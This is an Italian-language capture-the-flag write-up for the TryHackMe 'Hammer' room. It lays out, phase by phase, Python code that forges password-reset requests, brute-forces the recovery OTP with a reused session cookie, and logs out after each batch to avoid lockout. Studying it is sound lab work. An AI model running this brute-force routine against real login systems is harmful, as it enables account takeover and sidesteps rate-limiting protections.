CTF HAMMER ON THM
Tool python creato per bypassare il login alla dashboard.

FASE 1:
    • Caricamento e convalida codici otp da file .txt
        ◦ otp.otp_from_txt(otp_txt)
            ▪ def is_otp(otp_code, len_code_ok):
                  n_char_code = len(otp_code)
                  if(n_char_code < len_code_ok or n_char_code > len_code_ok):
                      return False
                  else:
                      return True	


FASE 2:
    • Forgiatura richiesta pw reset 
        ◦ http_req_pwRst = forge.reset_pw_req(url_rst_pw)
            ▪ def reset_pw_req(url, email = None, session_id=None):
              …………………………….
              else:
                      headers = {
                          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                          "Accept-Language": "en-US,en;q=0.5",
                          "Accept-Encoding": "gzip, deflate, br",
                          "Connection": "keep-alive",
                      }
                  return {"url":url, "headers": headers}

    • Richiesta per pw reset, e recupero session_id 
        ◦ cookie = otp_req.do_request(http_req_pwRst)
            ▪ def do_request(http_req_pwRst, flag=None):
                  if(not flag):
                      response = requests.get(url=http_req_pwRst['url'], headers=http_req_pwRst['headers'])
              ……………………………………….
              return response.cookies.get_dict()['PHPSESSID']


FASE 3:
    • Forgiatura richiesta per pw reset, con email valida e cookie
        ◦ http_req_pwRst = forge.reset_pw_req(url_rst_pw, email_user, cookie)
            ▪ def reset_pw_req(url, email = None, session_id=None):
                  if(session_id):
                      headers = {
                          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                          "Accept-Language": "en-US,en;q=0.5",
                          "Accept-Encoding": "gzip, deflate, br",
                          "Connection": "keep-alive",
                          "Cookie": f"PHPSESSID={session_id}"
                      }
              data = {"email":email}
              return {"url":url, "headers": headers, "data":data}
              ………………………………..

    • Richiesta per pw reset, con email valida e cookie settato
        ◦ otp_req.do_request(http_req_pwRst, flag = "pw")
              elif(flag == "pw"):
                      #print("SEND PW RST")
                      response = requests.post(url=http_req_pwRst['url'], data=http_req_pwRst['data'], headers=http_req_pwRst['headers'])


FASE 4:
    • Forgiatura richiesta BruteForce, con url di inserimento otp, cookie e code
        ◦ code = otp_codes.pop(0)
        ◦ http_req_OTP = forge.otp_brute_req(url_otp, cookie, code)
            ▪ def otp_brute_req(url, session_id, otp_code):
                  headers = {
                      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                      "Accept-Language": "en-US,en;q=0.5",
                      "Accept-Encoding": "gzip, deflate, br",
                      "Connection": "keep-alive",
                      "Cookie": f"PHPSESSID={session_id}"
                  }
                  data = {"recovery_code": otp_code, "s":140}
                  return {"url":url, "headers": headers, "data":data}

    • Richiesta convalida otp, stringa di errore otp, otp e cookie settato
        ◦ Eseguita n volte, n < n_request lock out.
        ◦ otp_req.bruteOTP(http_req_OTP, error, cookie)
          def bruteOTP(http_req_otp, error, cookie):
                  response = requests.post(url=http_req_otp['url'], data=http_req_otp['data'], headers=http_req_otp['headers'])
                  if( not error in response.text):
                      exit(f"\nOTP TROVATO: {http_req_otp['data']} \n Cookie: {cookie}")


FASE 5:
    • Forgiatura richiesta logout, con url di logout e cookie settato
        ◦ logout_req = forge.logout_req(logout_path, cookie)
              def logout_req(url, session_id):
                  headers = {
                      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                      "Accept-Language": "en-US,en;q=0.5",
                      "Accept-Encoding": "gzip, deflate, br",
                      "Connection": "keep-alive",
                      "Cookie": f"PHPSESSID={session_id}"
                  }
                  return {"url": url, "headers": headers}

    • Richiesta di logout
        ◦ logout_req = forge.logout_req(logout_path, cookie)
              otp_req.logout(logout_req)
                          n_requests = 0
                          print(f"RIMANGONO {len(otp_codes)} OTP DA TESTARE")

